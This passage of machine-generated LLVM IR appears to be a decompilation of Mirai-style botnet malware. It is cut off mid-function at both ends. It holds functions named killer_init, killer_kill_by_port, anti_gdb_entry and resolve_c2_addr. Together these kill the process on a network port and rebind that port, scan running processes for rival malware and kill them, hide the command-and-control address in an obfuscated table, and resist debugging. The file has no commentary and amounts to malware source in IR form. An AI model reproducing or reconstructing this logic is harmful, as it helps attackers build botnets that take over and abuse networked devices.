  %v3_e2e0 = call i32 @util_strcpy(i8* %v2_e2e0, i32 %v3_e2d4)
  %v2_e2e8 = call i32 @util_strlen(i8* %v3_df30)
  %v1_e2f0 = load i32, i32* @sl, align 4
  %v2_e2f0 = add i32 %v1_e2f0, %v2_e2e8
  store i32 %v2_e2f0, i32* @r0, align 4
  %v2_e2f4 = inttoptr i32 %v2_e2f0 to i8*
  %v3_e2f4 = call i32 @util_strcpy(i8* %v2_e2f4, i32 ptrtoint (i32* @global_var_1b36c.32 to i32))
  %v2_e2fc = call i32 @util_strlen(i8* %v3_df30)
  %v0_e300 = load i32, i32* @r6, align 4
  %v1_e300 = add i32 %v0_e300, 11
  %v1_e304 = load i32, i32* @sl, align 4
  %v2_e304 = add i32 %v1_e304, %v2_e2fc
  store i32 %v2_e304, i32* @r0, align 4
  %v2_e308 = inttoptr i32 %v2_e304 to i8*
  %v3_e308 = call i32 @util_strcpy(i8* %v2_e308, i32 %v1_e300)
  %v3_e318 = call i32 @readlink(i32 %v2_df0c, i32 %v2_defc, i32 4096)
  %v7_e31c = icmp eq i32 %v3_e318, -1
  br i1 %v7_e31c, label %dec_label_pc_e270.loopexit, label %dec_label_pc_e328

dec_label_pc_e328:                                ; preds = %dec_label_pc_e290
  %v2_e328 = call i32 @util_strlen(i8* %v3_df1c)
  store i32 %v2_e328, i32* @r1, align 4
  %v4_e33c = call i32 @util_stristr(i8* %v3_df1c, i32 %v2_e328, i32 %v2_e148.pre-phi)
  %v7_e340 = icmp eq i32 %v4_e33c, -1
  br i1 %v7_e340, label %dec_label_pc_e270.loopexit, label %dec_label_pc_e350

dec_label_pc_e350:                                ; preds = %dec_label_pc_e328
  %v0_e348 = load i32, i32* @r7, align 4
  %v2_e350 = inttoptr i32 %v0_e348 to i8*
  %v3_e350 = call i32 @util_atoi(i8* %v2_e350, i32 10)
  %v2_e358 = call i32 @kill(i32 %v3_e350, i32 9)
  %v0_e35c = load i32, i32* @r8, align 4
  %v1_e360 = inttoptr i32 %v0_e35c to i32*
  %v2_e360 = call i32 @__GI_readdir(i32* %v1_e360)
  store i32 %v2_e360, i32* @r6, align 4
  %v2_e364 = icmp eq i32 %v2_e360, 0
  store i32 1, i32* @r5, align 4
  br i1 %v2_e364, label %dec_label_pc_e378, label %dec_label_pc_e288

dec_label_pc_e378:                                ; preds = %dec_label_pc_e270.loopexit, %dec_label_pc_e350, %dec_label_pc_e288, %dec_label_pc_e270.preheader
  %v0_e378 = load i32, i32* @r8, align 4
  %v1_e37c = inttoptr i32 %v0_e378 to i32*
  %v2_e37c = call i32 @__GI_closedir(i32* %v1_e37c)
  %v0_e380 = load i32, i32* @sb, align 4
  %v1_e384 = inttoptr i32 %v0_e380 to i32*
  %v2_e384 = call i32 @__GI_readdir(i32* %v1_e384)
  %v2_e388 = icmp eq i32 %v2_e384, 0
  br i1 %v2_e388, label %dec_label_pc_e390, label %dec_label_pc_e18c

dec_label_pc_e390:                                ; preds = %dec_label_pc_e17c.loopexit, %dec_label_pc_e378, %dec_label_pc_e18c, %dec_label_pc_e17c.preheader
  %v0_e390 = load i32, i32* @sb, align 4
  %v1_e394 = inttoptr i32 %v0_e390 to i32*
  %v2_e394 = call i32 @__GI_closedir(i32* %v1_e394)
  %v0_e398 = load i32, i32* @r5, align 4
  %v1_e398 = urem i32 %v0_e398, 256
  br label %dec_label_pc_e39c

dec_label_pc_e39c:                                ; preds = %dec_label_pc_e15c, %dec_label_pc_e390
  %storemerge = phi i32 [ %v1_e398, %dec_label_pc_e390 ], [ 0, %dec_label_pc_e15c ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_e3a0 = call i32 @sleep(i32 1)
  br label %dec_label_pc_e3a8

dec_label_pc_e3a8:                                ; preds = %dec_label_pc_e13c, %dec_label_pc_e39c
  %v1_e3a8 = call i32 @table_lock_val(i32 4)
  %v1_e3b0 = call i32 @table_lock_val(i32 5)
  %v1_e3b8 = call i32 @table_lock_val(i32 6)
  %v1_e3c0 = call i32 @table_lock_val(i32 7)
  %v0_e3c4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e3c4

dec_label_pc_e3c4:                                ; preds = %bb, %dec_label_pc_e3a8
  %v0_e3c4 = phi i32 [ %v1_df9c, %bb ], [ %v0_e3c4.pre, %dec_label_pc_e3a8 ]
  store i32 %v3_deb4, i32* @r4, align 4
  store i32 %v6_deb4, i32* @r5, align 4
  store i32 %v9_deb4, i32* @r6, align 4
  store i32 %v12_deb4, i32* @r7, align 4
  store i32 %v15_deb4, i32* @r8, align 4
  store i32 %v18_deb4, i32* @sb, align 4
  store i32 %v21_deb4, i32* @sl, align 4
  store i32 %v24_deb4, i32* @fp, align 4
  store i32 %v27_deb4, i32* @lr, align 4
  ret i32 %v0_e3c4

dec_label_pc_e3d8:                                ; preds = %dec_label_pc_e0ac
  %v1_e3d8 = add i32 %v0_e3d8, 1
  %v7_e3dc = icmp eq i32 %v0_e3d8, 0
  br i1 %v7_e3dc, label %dec_label_pc_e3e4, label %dec_label_pc_e0b4

dec_label_pc_e3e4:                                ; preds = %dec_label_pc_e3d8
  %v1_e3e4 = add i32 %v0_e0bc, 3
  %v2_e3e4 = inttoptr i32 %v1_e3e4 to i8*
  %v3_e3e4 = load i8, i8* %v2_e3e4, align 1
  %v7_e3e8 = icmp eq i8 %v3_e3e4, 65
  br i1 %v7_e3e8, label %dec_label_pc_e3fc, label %dec_label_pc_e3f0

dec_label_pc_e3f0:                                ; preds = %dec_label_pc_e3e4, %dec_label_pc_e3fc
  %v0_e0c483 = phi i32 [ %v0_e0c484, %dec_label_pc_e3e4 ], [ 1, %dec_label_pc_e3fc ]
  br label %dec_label_pc_e08c.backedge

dec_label_pc_e08c.backedge:                       ; preds = %dec_label_pc_e3f0, %dec_label_pc_e0b8
  %v0_e0c482 = phi i32 [ %v0_e0c483, %dec_label_pc_e3f0 ], [ %v0_e0c484, %dec_label_pc_e0b8 ]
  %v0_e3d874 = phi i32 [ %v1_e3d8, %dec_label_pc_e3f0 ], [ %v0_e0b8, %dec_label_pc_e0b8 ]
  %v0_e0ac.pr71 = phi i32 [ 0, %dec_label_pc_e3f0 ], [ %v0_e0ac.pr72, %dec_label_pc_e0b8 ]
  %v0_e08c = add i32 %v0_e0bc, 1
  %v1_e08c = add i32 %v0_e0bc, 3
  %v2_e08c = inttoptr i32 %v1_e08c to i8*
  %v3_e08c = load i8, i8* %v2_e08c, align 1
  %v4_e08c = zext i8 %v3_e08c to i32
  store i32 %v4_e08c, i32* @r3, align 4
  %v2_e090 = icmp eq i8 %v3_e08c, 0
  %v1_e094 = add i32 %v0_e09479, 1
  br i1 %v2_e090, label %dec_label_pc_e0c4, label %dec_label_pc_e09c

dec_label_pc_e3fc:                                ; preds = %dec_label_pc_e3e4
  store i32 1, i32* @lr, align 4
  br label %dec_label_pc_e3f0

dec_label_pc_e404:                                ; preds = %entry
  store i8 48, i8* %stack_var_-72, align 1
  br label %dec_label_pc_df60

; uselistorder directives
  uselistorder i32 %v1_e094, { 1, 0 }
  uselistorder i32 %v4_e08c, { 1, 0 }
  uselistorder i32 %v0_e0c482, { 1, 0 }
  uselistorder i32 %v1_e3d8, { 1, 0 }
  uselistorder i32 %v2_e384, { 1, 0 }
  uselistorder i32 %v1_e0f0, { 1, 0 }
  uselistorder i32 %v0_e0fc30, { 1, 0 }
  uselistorder i32 %v1_e114, { 0, 3, 1, 2 }
  uselistorder i32 %v0_e0b8, { 1, 0 }
  uselistorder i32 %v0_e09479, { 1, 0 }
  uselistorder i32 %v0_e3d8, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_e0c484, { 1, 2, 0 }
  uselistorder i32 %v1_e09455, { 1, 0 }
  uselistorder i32 %v2_e078, { 1, 0 }
  uselistorder i32 %v1_e074, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_e034, { 0, 2, 1 }
  uselistorder i32 %v0_e03416, { 1, 0 }
  uselistorder i32 %v1_e000, { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i32 %v3_df90, { 1, 2, 0 }
  uselistorder i32 %v0_df38, { 1, 0 }
  uselistorder i32 %v2_df34, { 1, 0, 2 }
  uselistorder i8* %v3_df1c, { 1, 0, 2 }
  uselistorder i32 %v2_defc, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-585, { 1, 4, 0, 2, 3 }
  uselistorder i8* %stack_var_-72, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i32, i32, i32)* @readlink, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @util_fdgets, { 1, 0 }
  uselistorder label %dec_label_pc_e3f0, { 1, 0 }
  uselistorder label %dec_label_pc_e3c4, { 1, 0 }
  uselistorder label %dec_label_pc_e3a8, { 1, 0 }
  uselistorder label %dec_label_pc_e39c, { 1, 0 }
  uselistorder label %dec_label_pc_e390, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_e378, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_e288, { 1, 0 }
  uselistorder label %dec_label_pc_e288thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_e270.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_e18c, { 1, 0 }
  uselistorder label %dec_label_pc_e18c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_e17c.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e110, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e0b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e09c, { 1, 0 }
  uselistorder label %dec_label_pc_e040, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_dfa4.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_dff4, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_dfbc, { 1, 0 }
  uselistorder label %dec_label_pc_df60, { 1, 0 }
}

define i32 @killer_init(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-632 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %v3_e430 = load i32, i32* @r4, align 4
  %v6_e430 = load i32, i32* @r5, align 4
  %v9_e430 = load i32, i32* @r6, align 4
  %v12_e430 = load i32, i32* @r7, align 4
  %v15_e430 = load i32, i32* @r8, align 4
  %v18_e430 = load i32, i32* @sb, align 4
  %v21_e430 = load i32, i32* @sl, align 4
  %v24_e430 = load i32, i32* @fp, align 4
  %v2_e43c = call i32 @__GI_time(i32* null)
  store i32 %v2_e43c, i32* @r5, align 4
  %v0_e444 = call i32 @__libc_fork()
  %v7_e448 = icmp eq i32 %v0_e444, -1
  %. = zext i1 %v7_e448 to i32
  %tmp69 = icmp slt i32 %v0_e444, 1
  %storemerge50 = select i1 %tmp69, i32 %., i32 1
  store i32 %storemerge50, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_24648.102 to i32), i32* %r3.global-to-local, align 4
  %v2_e464 = icmp eq i32 %storemerge50, 0
  store i32 %v0_e444, i32* @global_var_24648.102, align 4
  br i1 %v2_e464, label %dec_label_pc_e47c, label %dec_label_pc_e470

dec_label_pc_e470:                                ; preds = %dec_label_pc_e4cc, %entry
  %v1_e478 = phi i32 [ %v0_e444, %entry ], [ 0, %dec_label_pc_e4cc ]
  store i32 %v3_e430, i32* @r4, align 4
  store i32 %v6_e430, i32* @r5, align 4
  store i32 %v9_e430, i32* @r6, align 4
  store i32 %v12_e430, i32* @r7, align 4
  store i32 %v15_e430, i32* @r8, align 4
  store i32 %v18_e430, i32* @sb, align 4
  store i32 %v21_e430, i32* @sl, align 4
  store i32 %v24_e430, i32* @fp, align 4
  ret i32 %v1_e478

dec_label_pc_e47c:                                ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v1_e490 = call i32 @killer_kill_by_port(i32 20736)
  %v2_e494 = icmp eq i32 %v1_e490, 0
  br i1 %v2_e494, label %dec_label_pc_e49c, label %dec_label_pc_e6f8

dec_label_pc_e49c:                                ; preds = %dec_label_pc_e47c, %dec_label_pc_e6f8, %dec_label_pc_e720
  %v1_e4a0 = call i32 @sleep(i32 5)
  store i32 4096, i32* @r0, align 4
  %v0_e4a8 = call i32 @malloc()
  %v1_e4a8 = inttoptr i32 %v0_e4a8 to i8*
  store i32 %v0_e4a8, i32* @global_var_27168.106, align 4
  store i32 ptrtoint (i32* @global_var_2464c.108 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_e4a8, align 1
  %v0_e4c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_e4c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_e4c0 = inttoptr i32 %v1_e4c0 to i32*
  store i32 %v0_e4c0, i32* %v2_e4c0, align 4
  %v0_e4c4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_e4c4, i32* @fp, align 4
  store i32 400, i32* @r6, align 4
  %v2_e5c0 = ptrtoint i32* %stack_var_-120 to i32
  %v2_e5cc = bitcast i32* %stack_var_-120 to i8*
  %v2_e62c = ptrtoint i32* %stack_var_-632 to i32
  br label %dec_label_pc_e4cc

dec_label_pc_e4cc:                                ; preds = %dec_label_pc_e58c, %dec_label_pc_e49c
  %v1_e4d0 = call i32 @table_unlock_val(i32 4)
  %v3_e4dc = call i32 @table_retrieve_val(i32 4, i32* null)
  %v1_e4e0 = call i32 @__GI_opendir(i32 %v3_e4dc)
  store i32 %v1_e4e0, i32* @sl, align 4
  %v2_e4e4 = icmp eq i32 %v1_e4e0, 0
  br i1 %v2_e4e4, label %dec_label_pc_e470, label %dec_label_pc_e4ec

dec_label_pc_e4ec:                                ; preds = %dec_label_pc_e4cc
  %v1_e4f0 = call i32 @table_lock_val(i32 4)
  %v0_e4f431 = load i32, i32* @sl, align 4
  %v1_e4f832 = inttoptr i32 %v0_e4f431 to i32*
  %v2_e4f833 = call i32 @__GI_readdir(i32* %v1_e4f832)
  %v2_e4fc35 = icmp eq i32 %v2_e4f833, 0
  br i1 %v2_e4fc35, label %dec_label_pc_e58c, label %dec_label_pc_e504.preheader

dec_label_pc_e504.preheader:                      ; preds = %dec_label_pc_e4ec, %dec_label_pc_e4f4.backedge
  %v0_e50440 = phi i32 [ %v2_e4f8, %dec_label_pc_e4f4.backedge ], [ %v2_e4f833, %dec_label_pc_e4ec ]
  br label %dec_label_pc_e504

dec_label_pc_e504:                                ; preds = %dec_label_pc_e504.preheader, %dec_label_pc_e574
  %v0_e514 = phi i32 [ %v0_e50440, %dec_label_pc_e504.preheader ], [ %v2_e580, %dec_label_pc_e574 ]
  %v1_e504 = add i32 %v0_e514, 11
  %v2_e504 = inttoptr i32 %v1_e504 to i8*
  %v3_e504 = load i8, i8* %v2_e504, align 1
  %v4_e504 = zext i8 %v3_e504 to i32
  %v1_e508 = add nsw i32 %v4_e504, -48
  store i32 %v1_e508, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_e508, 9
  br i1 %tmp, label %dec_label_pc_e4f4.backedge, label %dec_label_pc_e514

dec_label_pc_e514:                                ; preds = %dec_label_pc_e504
  store i32 %v1_e504, i32* @r4, align 4
  %v3_e520 = call i32 @util_atoi(i8* %v2_e504, i32 10)
  %v0_e524 = load i32, i32* @r6, align 4
  store i32 %v3_e520, i32* @r8, align 4
  %v0_e52c = load i32, i32* @fp, align 4
  %v1_e52c = add i32 %v0_e52c, 1
  store i32 %v1_e52c, i32* @fp, align 4
  %v5_e530 = icmp slt i32 %v0_e524, %v3_e520
  %v2_e59c = call i32 @__GI_time(i32* null)
  br i1 %v5_e530, label %dec_label_pc_e598, label %dec_label_pc_e534

dec_label_pc_e534:                                ; preds = %dec_label_pc_e514
  %v0_e53c = load i32, i32* @r5, align 4
  %v2_e53c = sub i32 %v2_e59c, %v0_e53c
  %v7_e544 = icmp slt i32 %v2_e53c, 601
  br i1 %v7_e544, label %dec_label_pc_e54c, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_e534
  store i32 400, i32* @r6, align 4
  br label %dec_label_pc_e4f4.backedge

dec_label_pc_e54c:                                ; preds = %dec_label_pc_e534
  %v0_e54c = load i32, i32* @r8, align 4
  %v7_e550 = icmp slt i32 %v0_e54c, 401
  br i1 %v7_e550, label %dec_label_pc_e4f4.backedge, label %dec_label_pc_e554

dec_label_pc_e554:                                ; preds = %dec_label_pc_e54c
  %v2_e558 = load i32, i32* @fp, align 4
  %v3_e558 = zext i32 %v2_e558 to i64
  %v4_e558 = mul nuw i64 %v3_e558, 3435973837
  %v3_e55c1 = udiv i64 %v4_e558, 34359738368
  %v3_e5603 = mul nuw nsw i64 %v3_e55c1, 8
  %v3_e560 = trunc i64 %v3_e5603 to i32
  store i32 %v3_e560, i32* %r3.global-to-local, align 4
  %v2_e5645 = mul nuw nsw i64 %v3_e55c1, 2
  %v2_e564 = trunc i64 %v2_e5645 to i32
  %v2_e568 = add i32 %v3_e560, %v2_e564
  store i32 %v2_e568, i32* %r2.global-to-local, align 4
  %v9_e56c = icmp eq i32 %v2_e558, %v2_e568
  br i1 %v9_e56c, label %dec_label_pc_e574, label %dec_label_pc_e4f4.backedge

dec_label_pc_e574:                                ; preds = %dec_label_pc_e554
  %v1_e578 = call i32 @sleep(i32 1)
  %v0_e57c = load i32, i32* @sl, align 4
  %v1_e580 = inttoptr i32 %v0_e57c to i32*
  %v2_e580 = call i32 @__GI_readdir(i32* %v1_e580)
  %v2_e584 = icmp eq i32 %v2_e580, 0
  br i1 %v2_e584, label %dec_label_pc_e58c, label %dec_label_pc_e504

dec_label_pc_e58c:                                ; preds = %dec_label_pc_e4f4.backedge, %dec_label_pc_e574, %dec_label_pc_e4ec
  %v0_e58c = load i32, i32* @sl, align 4
  %v1_e590 = inttoptr i32 %v0_e58c to i32*
  %v2_e590 = call i32 @__GI_closedir(i32* %v1_e590)
  br label %dec_label_pc_e4cc

dec_label_pc_e598:                                ; preds = %dec_label_pc_e514
  %v1_e5a8 = call i32 @table_unlock_val(i32 4)
  %v1_e5b0 = call i32 @table_unlock_val(i32 8)
  %v3_e5bc = call i32 @table_retrieve_val(i32 4, i32* null)
  store i32 %v2_e5c0, i32* @sb, align 4
  store i32 %v2_e5c0, i32* @r0, align 4
  %v3_e5cc = call i32 @util_strcpy(i8* %v2_e5cc, i32 %v3_e5bc)
  %v1_e5d0 = load i32, i32* @sb, align 4
  %v2_e5d0 = add i32 %v1_e5d0, %v3_e5cc
  store i32 %v2_e5d0, i32* @r5, align 4
  %v0_e5d4 = load i32, i32* @r4, align 4
  store i32 %v2_e5d0, i32* @r0, align 4
  %v2_e5dc = inttoptr i32 %v2_e5d0 to i8*
  %v3_e5dc = call i32 @util_strcpy(i8* %v2_e5dc, i32 %v0_e5d4)
  store i32 %v3_e5dc, i32* @r4, align 4
  %v3_e5ec = call i32 @table_retrieve_val(i32 8, i32* null)
  %v0_e5f4 = load i32, i32* @r4, align 4
  %v1_e5f4 = load i32, i32* @r5, align 4
  %v2_e5f4 = add i32 %v1_e5f4, %v0_e5f4
  store i32 %v2_e5f4, i32* @r0, align 4
  %v2_e5f8 = inttoptr i32 %v2_e5f4 to i8*
  %v3_e5f8 = call i32 @util_strcpy(i8* %v2_e5f8, i32 %v3_e5ec)
  %v1_e600 = call i32 @table_lock_val(i32 4)
  %v1_e608 = call i32 @table_lock_val(i32 8)
  %v3_e614 = call i32 @__libc_open(i32 %v2_e5c0, i16* null)
  %v7_e618 = icmp eq i32 %v3_e614, -1
  store i32 %v3_e614, i32* @r7, align 4
  br i1 %v7_e618, label %dec_label_pc_e6c4, label %dec_label_pc_e624

dec_label_pc_e624:                                ; preds = %dec_label_pc_e598
  %v1_e628 = call i32 @table_unlock_val(i32 58)
  store i32 %v2_e62c, i32* @r6, align 4
  %v0_e63027 = load i32, i32* @r7, align 4
  store i32 %v2_e62c, i32* @r1, align 4
  store i32 512, i32* @r2, align 4
  %v1_e63c28 = call i32 @__libc_read(i32 %v0_e63027)
  store i32 %v1_e63c28, i32* @r4, align 4
  %tmp72 = icmp slt i32 %v1_e63c28, 1
  br i1 %tmp72, label %dec_label_pc_e6e4, label %dec_label_pc_e648

dec_label_pc_e648:                                ; preds = %dec_label_pc_e624, %dec_label_pc_e630.backedge
  %v3_e650 = call i32 @table_retrieve_val(i32 58, i32* null)
  store i32 %v3_e650, i32* @r5, align 4
  %v3_e660 = call i32 @table_retrieve_val(i32 58, i32* null)
  %v1_e664 = inttoptr i32 %v3_e660 to i8*
  %v2_e664 = call i32 @util_strlen(i8* %v1_e664)
  %v0_e668 = load i32, i32* @r4, align 4
  %v5_e66c = icmp slt i32 %v0_e668, %v2_e664
  br i1 %v5_e66c, label %dec_label_pc_e630.backedge, label %.thread12

dec_label_pc_e630.backedge:                       ; preds = %dec_label_pc_e694, %.thread12, %dec_label_pc_e648
  %v0_e630 = load i32, i32* @r7, align 4
  store i32 %v2_e62c, i32* @r1, align 4
  store i32 512, i32* @r2, align 4
  %v1_e63c = call i32 @__libc_read(i32 %v0_e630)
  store i32 %v1_e63c, i32* @r4, align 4
  %tmp73 = icmp slt i32 %v1_e63c, 1
  br i1 %tmp73, label %dec_label_pc_e6e4, label %dec_label_pc_e648

.thread12:                                        ; preds = %dec_label_pc_e648
  %v1_e67819 = add i32 %v0_e668, -1
  store i32 %v1_e67819, i32* @r4, align 4
  %v2_e67820 = icmp eq i32 %v0_e668, 0
  br i1 %v2_e67820, label %dec_label_pc_e630.backedge, label %dec_label_pc_e680.lr.ph

dec_label_pc_e680.lr.ph:                          ; preds = %.thread12
  %v0_e680.pre = load i32, i32* @r5, align 4
  %v1_e684.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e680

dec_label_pc_e680:                                ; preds = %dec_label_pc_e694, %dec_label_pc_e680.lr.ph
  %v0_e678 = phi i32 [ %v1_e67819, %dec_label_pc_e680.lr.ph ], [ %v1_e678, %dec_label_pc_e694 ]
  %v0_e694 = phi i32 [ 0, %dec_label_pc_e680.lr.ph ], [ %v1_e694, %dec_label_pc_e694 ]
  %v1_e680 = phi i32 [ 0, %dec_label_pc_e680.lr.ph ], [ %v1_e68043, %dec_label_pc_e694 ]
  %v2_e680 = add i32 %v1_e680, %v0_e680.pre
  %v3_e680 = inttoptr i32 %v2_e680 to i8*
  %v4_e680 = load i8, i8* %v3_e680, align 1
  %v6_e680 = zext i8 %v4_e680 to i32
  store i32 %v6_e680, i32* %r2.global-to-local, align 4
  %v2_e684 = add i32 %v0_e694, %v1_e684.pre
  %v3_e684 = inttoptr i32 %v2_e684 to i8*
  %v4_e684 = load i8, i8* %v3_e684, align 1
  %v6_e684 = zext i8 %v4_e684 to i32
  store i32 %v6_e684, i32* @r3, align 4
  %v9_e688 = icmp eq i8 %v4_e684, %v4_e680
  br i1 %v9_e688, label %dec_label_pc_e69c, label %bb74

bb74:                                             ; preds = %dec_label_pc_e680
  br label %dec_label_pc_e694

dec_label_pc_e694:                                ; preds = %bb74, %dec_label_pc_e69c
  %v1_e68043 = phi i32 [ %v1_e69c, %dec_label_pc_e69c ], [ 0, %bb74 ]
  %v1_e694 = add i32 %v0_e694, 1
  %v1_e678 = add i32 %v0_e678, -1
  store i32 %v1_e678, i32* @r4, align 4
  %v2_e678 = icmp eq i32 %v0_e678, 0
  br i1 %v2_e678, label %dec_label_pc_e630.backedge, label %dec_label_pc_e680

dec_label_pc_e69c:                                ; preds = %dec_label_pc_e680
  %v1_e69c = add i32 %v1_e680, 1
  %v9_e6a0 = icmp eq i32 %v2_e664, %v1_e69c
  br i1 %v9_e6a0, label %dec_label_pc_e6a8, label %dec_label_pc_e694

dec_label_pc_e6a8:                                ; preds = %dec_label_pc_e69c
  %v1_e6ac = call i32 @table_lock_val(i32 58)
  %v0_e6b0 = load i32, i32* @r7, align 4
  %v1_e6b4 = call i32 @__GI___libc_close(i32 %v0_e6b0)
  %v0_e6b8 = load i32, i32* @r8, align 4
  %v2_e6c0 = call i32 @kill(i32 %v0_e6b8, i32 9)
  br label %dec_label_pc_e6c4

dec_label_pc_e6c4:                                ; preds = %dec_label_pc_e598, %dec_label_pc_e6e4, %dec_label_pc_e6a8
  %v2_e6cc = call i32 @util_zero(i32 %v2_e5c0, i32 64)
  %v1_e6d4 = call i32 @sleep(i32 1)
  store i32 %v2_e59c, i32* @r5, align 4
  %v0_e6dc = load i32, i32* @r8, align 4
  store i32 %v0_e6dc, i32* @r6, align 4
  br label %dec_label_pc_e4f4.backedge

dec_label_pc_e4f4.backedge:                       ; preds = %dec_label_pc_e554, %dec_label_pc_e54c, %dec_label_pc_e504, %dec_label_pc_e6c4, %.thread7
  %v0_e4f4 = load i32, i32* @sl, align 4
  %v1_e4f8 = inttoptr i32 %v0_e4f4 to i32*
  %v2_e4f8 = call i32 @__GI_readdir(i32* %v1_e4f8)
  %v2_e4fc = icmp eq i32 %v2_e4f8, 0
  br i1 %v2_e4fc, label %dec_label_pc_e58c, label %dec_label_pc_e504.preheader

dec_label_pc_e6e4:                                ; preds = %dec_label_pc_e630.backedge, %dec_label_pc_e624
  %v1_e6e8 = call i32 @table_lock_val(i32 58)
  %v0_e6ec = load i32, i32* @r7, align 4
  %v1_e6f0 = call i32 @__GI___libc_close(i32 %v0_e6ec)
  br label %dec_label_pc_e6c4

dec_label_pc_e6f8:                                ; preds = %dec_label_pc_e47c
  %v2_e480 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_e480, i32* %r3.global-to-local, align 4
  %v0_e700 = load i32, i32* @r4, align 4
  store i32 %v0_e700, i32* %r2.global-to-local, align 4
  %v3_e710 = call i32 @socket(i32 2, i32 1, i32 %v0_e700)
  %v7_e714 = icmp eq i32 %v3_e710, -1
  store i32 %v3_e710, i32* @r4, align 4
  br i1 %v7_e714, label %dec_label_pc_e49c, label %dec_label_pc_e720

dec_label_pc_e720:                                ; preds = %dec_label_pc_e6f8
  %v2_e720 = ptrtoint i32* %stack_var_-56 to i32
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e728 = call i32 @bind(i32 %v3_e710, i32 %v2_e720, i32 16)
  %v0_e72c = load i32, i32* @r4, align 4
  %v2_e734 = call i32 @listen(i32 %v0_e72c, i32 1)
  br label %dec_label_pc_e49c

; uselistorder directives
  uselistorder i32 %v3_e710, { 2, 1, 0 }
  uselistorder i32 %v2_e4f8, { 1, 0 }
  uselistorder i32 %v1_e69c, { 1, 0 }
  uselistorder i32 %v1_e678, { 1, 0 }
  uselistorder i32 %v1_e680, { 1, 0 }
  uselistorder i32 %v0_e694, { 1, 0 }
  uselistorder i32 %v0_e678, { 1, 0 }
  uselistorder i32 %v0_e668, { 1, 0, 2 }
  uselistorder i32 %v2_e664, { 1, 0 }
  uselistorder i32 %v3_e614, { 1, 0 }
  uselistorder i32 %v2_e580, { 1, 0 }
  uselistorder i32 %v2_e62c, { 1, 0, 2 }
  uselistorder i32 %storemerge50, { 1, 0 }
  uselistorder i32 %v0_e444, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32 (i32*)* @__GI_readdir, { 4, 3, 0, 5, 6, 7, 2, 8, 1 }
  uselistorder i32 (i32)* @__GI_opendir, { 2, 1, 0 }
  uselistorder i32* @global_var_24648.102, { 0, 2, 1 }
  uselistorder label %dec_label_pc_e4f4.backedge, { 3, 0, 1, 4, 2 }
  uselistorder label %dec_label_pc_e6c4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e694, { 1, 0 }
  uselistorder label %dec_label_pc_e648, { 1, 0 }
  uselistorder label %dec_label_pc_e504, { 1, 0 }
  uselistorder label %dec_label_pc_e504.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_e49c, { 2, 1, 0 }
}

define i32 @anti_gdb_entry(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_e764.111 to i32), i32* @global_var_244d4.113, align 4
  ret i32 %arg1
}

define i32 @resolve_c2_addr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_e76c = call i32 @table_unlock_val(i32 1)
  store i32 ptrtoint (i16** @global_var_2716c.115 to i32), i32* @r4, align 4
  store i32 2032805430, i32* @global_var_27170.117, align 4
  %v3_e784 = call i32 @table_retrieve_val(i32 1, i32* null)
  %v4_e784 = inttoptr i32 %v3_e784 to i16*
  %v3_e788 = load i16, i16* %v4_e784, align 2
  store i16 %v3_e788, i16* bitcast (i32* @global_var_2716e.118 to i16*), align 4
  %v1_e794 = call i32 @table_lock_val(i32 1)
  ret i32 %v1_e794
}

define i32 @ensure_single_instance(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v9_e7a8 = load i32, i32* @r6, align 4
  %v12_e7a8 = load i32, i32* @r7, align 4
  %v15_e7a8 = load i32, i32* @r8, align 4
  store i32 1, i32* @r4, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_e7c4 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 ptrtoint (i32* @global_var_244cc.120 to i32), i32* @r6, align 4
  %v7_e7cc = icmp eq i32 %v3_e7c4, -1
  store i32 %v3_e7c4, i32* @global_var_244cc.120, align 4
  br i1 %v7_e7cc, label %dec_label_pc_e884, label %dec_label_pc_e7d8

dec_label_pc_e7d8:                                ; preds = %entry
  %v2_e7d8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_e7d8, i32* @r3, align 4
  %v0_e7dc = load i32, i32* @r4, align 4
